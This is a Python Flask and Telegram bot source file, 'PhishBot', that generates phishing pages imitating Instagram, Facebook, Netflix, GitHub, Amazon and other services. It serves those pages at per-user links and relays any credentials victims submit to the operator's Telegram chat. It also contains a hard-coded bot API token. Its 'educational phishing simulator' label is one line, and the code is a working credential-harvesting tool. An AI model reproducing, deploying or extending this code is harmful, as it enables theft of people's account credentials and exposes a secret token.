from flask import Flask, request, send_from_directory
import threading
import telebot
from telebot import types
import os
from injector import inject_payload_and_save
from uuid import uuid4

API_TOKEN = '8110718903:AAFlE-nSLZZPXUSmkYdEmCc69ZvIXp7iy_k'
bot = telebot.TeleBot(API_TOKEN)
app = Flask(__name__)

TEMPLATES = [
    "Instagram", "Facebook", "Netflix", "Twitter", "Snapchat",
    "GitHub", "LinkedIn", "Spotify", "Reddit", "Amazon"
]

user_states = {}

@app.route('/')
def home():
    return "🤖 Bot is running on Flask!"

# Serve the phishing page
@app.route('/phish/<user_id>', methods=['GET'])
def serve_phish_page(user_id):
    folder = f"phished_pages/{user_id}"
    return send_from_directory(folder, "index.html")

# Capture submitted credentials
@app.route('/submit/<user_id>', methods=['POST'])
def capture_creds(user_id):
    creds = request.form.to_dict()
    msg = "\n".join(f"{k}: {v}" for k, v in creds.items())
    bot.send_message(user_id, f"🛑 Credentials Captured:\n\n{msg}")
    return "✅ Credentials submitted."

# Bot logic
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    bot.reply_to(message, (
        "🎣 Welcome to PhishBot!\n\n"
        "Commands:\n"
        "/fish - Start phishing\n"
        "/info - About"
    ))

@bot.message_handler(commands=['info'])
def send_info(message):
    bot.reply_to(message, "Educational phishing simulator.")

@bot.message_handler(commands=['fish'])
def send_fish_menu(message):
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
    buttons = [types.KeyboardButton(site) for site in TEMPLATES]
    markup.add(*buttons)
    bot.send_message(message.chat.id, "📄 Choose a phishing template:", reply_markup=markup)

@bot.message_handler(func=lambda msg: msg.text in TEMPLATES)
def handle_template_selection(message):
    template = message.text
    user_id = str(message.chat.id)
    bot.send_message(message.chat.id, f"⚙️ Generating phishing page for {template}...")

    template_path = f"templates/{template}/index.html"
    output_path = f"phished_pages/{user_id}"
    os.makedirs(output_path, exist_ok=True)

    if inject_payload_and_save(template_path, output_path, user_id):
        phishing_url = f"https://notafish-1.onrender.com"
        bot.send_message(message.chat.id, f"✅ Done!\nSend this link:\n{phishing_url}")
    else:
        bot.send_message(message.chat.id, "❌ Failed to inject payload.")

@bot.message_handler(func=lambda m: True)
def fallback(m):
    bot.reply_to(m, "❓ Unknown command. Use /start")

def run_bot():
    bot.infinity_polling()

if __name__ == '__main__':
    threading.Thread(target=run_bot).start()
    app.run(host='0.0.0.0', port=5001)
